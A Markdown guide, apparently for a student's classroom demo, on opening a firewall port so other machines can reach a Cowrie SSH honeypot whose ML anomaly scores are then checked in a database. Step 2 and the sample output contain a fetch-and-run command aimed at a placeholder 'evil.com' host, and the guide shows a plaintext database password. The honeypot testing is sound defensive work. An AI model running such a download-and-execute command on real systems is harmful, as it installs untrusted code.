# 🌐 Setup Network Access for Different Machine Testing

## Current Status
- ✅ Cowrie listening on `0.0.0.0:2222` (all network interfaces)
- ✅ Your Windows IP: `192.168.1.4`
- ✅ WSL Cowrie IP: `172.26.29.248`
- ❌ Windows Firewall blocking external connections

---

## 🎯 GOAL: Allow Another Computer to Attack Your Honeypot

When you do this, attacks from other machines will show their REAL IP (like `192.168.1.5` instead of `127.0.0.1`)!

---

## 📋 Step-by-Step Setup

### **Step 1: Open Windows Firewall** (Run as Administrator)

**Option A - Using GUI:**
1. Press `Win + R`, type `wf.msc`, press Enter
2. Click "Inbound Rules" → "New Rule"
3. Choose "Port" → Next
4. Choose "TCP" → Specific local ports: `2222` → Next
5. Choose "Allow the connection" → Next
6. Check all (Domain, Private, Public) → Next
7. Name: `Cowrie Honeypot SSH` → Finish

**Option B - Using PowerShell (Run as Admin):**
```powershell
New-NetFirewallRule -DisplayName "Cowrie Honeypot SSH" -Direction Inbound -LocalPort 2222 -Protocol TCP -Action Allow
```

---

### **Step 2: Test from Another Device**

From **another computer** on the same WiFi network:

```bash
# On Linux/Mac
ssh -o StrictHostKeyChecking=no -p 2222 root@192.168.1.4

# On Windows (PowerShell)
ssh -o StrictHostKeyChecking=no -p 2222 root@192.168.1.4
```

**What to expect:**
- Password: Type anything (e.g., `password123`)
- You'll get a fake shell
- Type: `wget http://evil.com/malware.sh && bash malware.sh`
- Type: `exit`

---

### **Step 3: Check Database for Different IP**

```powershell
$env:PGPASSWORD="honeynet123"
psql -U honeynet -d honeynet -h localhost -p 5432 -c "
SELECT 
    source_ip,
    LEFT(command, 60) as command,
    severity,
    ROUND(anomaly_score::numeric, 3) as ml_score,
    timestamp
FROM events
WHERE source_ip != '127.0.0.1'
ORDER BY timestamp DESC
LIMIT 5;
"
```

**You should see:**
```
   source_ip    |                   command                    | severity | ml_score
----------------+----------------------------------------------+----------+----------
 192.168.1.5    | wget http://evil.com/malware.sh && bash...  | HIGH     | 0.900
```

---

## 🚀 **PROOF OF REAL-TIME ML ANALYSIS**

The ML will analyze attacks from ANY IP in real-time:
- ✅ `127.0.0.1` (your machine) → ML analyzes
- ✅ `192.168.1.5` (friend's laptop) → ML analyzes
- ✅ `192.168.1.10` (your phone) → ML analyzes
- ✅ `45.142.212.61` (internet hacker) → ML analyzes

**The IP doesn't matter - ML analyzes the COMMAND TEXT!**

---

## 📱 **Quick Test Using Your Phone**

1. Connect phone to same WiFi
2. Install app: "Termux" (Android) or "Terminus" (iOS)
3. Run: `ssh -p 2222 root@192.168.1.4`
4. Type malicious commands
5. Check database → You'll see your phone's IP!

---

## ⚠️ **IMPORTANT: For Demo Purposes Only**

**DO NOT** open port 2222 to the internet unless you:
- Know what you're doing
- Want real attackers (can be dangerous)
- Are prepared for thousands of attacks per day

**For your teacher demo:**
- Testing from same machine (127.0.0.1) = ✅ Fine
- Testing from another PC on WiFi = ✅ Better
- Internet exposure = ⚠️ Not needed for academic demo

---

## 🎓 **What This Proves to Your Teacher**

### **Same Machine (127.0.0.1):**
- ✅ Proves ML is working
- ✅ Shows real-time analysis
- ✅ Demonstrates adaptive system
- ⚠️ All IPs are 127.0.0.1

### **Different Machine (192.168.1.X):**
- ✅ Everything above, PLUS:
- ✅ Shows different source IPs
- ✅ More realistic attacker simulation
- ✅ Proves system works over network

**Bottom line:** Both are valid! The ML analysis is IDENTICAL!

---

## 🔧 Troubleshooting

### **Can't connect from another machine?**

1. Check firewall:
   ```powershell
   Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*Cowrie*"}
   ```

2. Verify Cowrie is running:
   ```powershell
   wsl -d Ubuntu-22.04 -u cowrie -- bash -c "ps aux | grep twistd"
   ```

3. Test from same machine first:
   ```powershell
   ssh -p 2222 root@192.168.1.4
   ```
   (Should work if firewall is open)

### **Connection refused?**

Check if port 2222 is listening on network:
```powershell
netstat -an | findstr 2222
```

Should show: `0.0.0.0:2222` or `*:2222`

---

## 📊 **Demo Comparison**

| **Test Method** | **IP Shown** | **ML Works?** | **Teacher Impression** |
|----------------|-------------|--------------|----------------------|
| Same machine | 127.0.0.1 | ✅ Yes | Good |
| Different PC | 192.168.1.X | ✅ Yes | Better |
| Internet | Real IPs | ✅ Yes | Best (risky) |

**Recommendation:** Use different PC if you have one, but same machine is perfectly fine!
